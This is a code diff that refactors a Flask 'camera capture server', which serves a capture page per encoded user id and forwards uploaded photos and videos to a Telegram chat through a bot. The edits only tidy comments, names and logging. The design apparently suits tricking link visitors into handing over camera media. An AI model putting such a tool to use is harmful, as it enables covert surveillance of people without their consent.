@@ -7,7 +7,6 @@ from utils import decode_uid
 import telebot
 from werkzeug.utils import secure_filename
 
-# Load .env
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -23,11 +22,9 @@ app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE_MB * 1024 * 1024
 
 logging.basicConfig(level=logging.INFO)
 
-
 @app.route("/")
-def home():
+def index():
     return "Camera capture server is running. Use /capture?uid=<id>"
-
 
 @app.route("/capture")
 def capture_page():
@@ -35,11 +32,10 @@ def capture_page():
     if not uid_enc:
         return abort(400, "uid missing")
     try:
-        _ = decode_uid(uid_enc)  # Validate UID
+        decode_uid(uid_enc)
     except Exception:
         return abort(400, "invalid uid")
     return render_template("index.html", uid=uid_enc)
-
 
 @app.route("/upload", methods=["POST"])
 def upload_media():
@@ -61,7 +57,7 @@ def upload_media():
     filename = secure_filename(f.filename) or f"{media_type}.bin"
     content = f.read()
 
-    logging.info(f"Received {media_type} from uid={uid_enc}, size={len(content)} bytes")
+    logging.info("Received %s from uid=%s: %s bytes", media_type, uid_enc, len(content))
 
     try:
         bio = io.BytesIO(content)
@@ -79,13 +75,11 @@ def upload_media():
             bot.send_video(chat_id, bio)
         else:
             bot.send_document(chat_id, bio)
-
     except Exception as e:
-        logging.exception(f"Failed to forward {media_type}: {e}")
+        logging.exception("Failed to forward media to Telegram: %s", e)
         return jsonify({"status": "error", "error": str(e)}), 500
 
     return jsonify({"status": "ok"})
-
 
 if __name__ == "__main__":
     port = int(os.getenv("PORT", "10000"))
